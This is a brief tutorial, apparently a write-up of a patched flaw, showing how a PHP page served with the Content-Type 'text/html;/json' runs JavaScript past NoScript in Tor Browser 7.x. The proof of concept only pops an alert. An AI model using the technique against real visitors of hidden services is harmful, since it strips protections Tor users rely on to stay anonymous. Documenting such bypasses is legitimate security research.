**first set up an hidden service following the other file in this folder**

**Whats is this vuln?**
Simply by changing the http header of the page and using 'text/html;/json' as the Content-Type you are able to bypass NoScript. NoScript is an extension for firefox, in tor browser it is configured to block **all javascript code** of any page. #bigfail #sad #nsa_has_your_ip #letscry2gether

then, lets create a simple php file to bypass it(u can use any language, but i am currently studying php so im gonna use it

```
cd /var/www/html/
nano noscript_bypass.php
```
```
<?php
header('Content-Type: text/html;/json;charset=utf-8');
?>
<html>
    <head>
        <title>NoScript Bypass</title>
    </head>
    <body>
        <script>
            window.alert("JS Bypassed :p");
        </script>
    </body>
</html>
```

cat your .onion domain and go to your domain **USING TOR BROWSER 7.x**(they fixed this flaw on later versions) and see if noscript is enabled, then

myoniondomainhere.onion/noscript_bypass.php


__and voila :), noscript bypassed__


**fake author name: Edward Snowden**
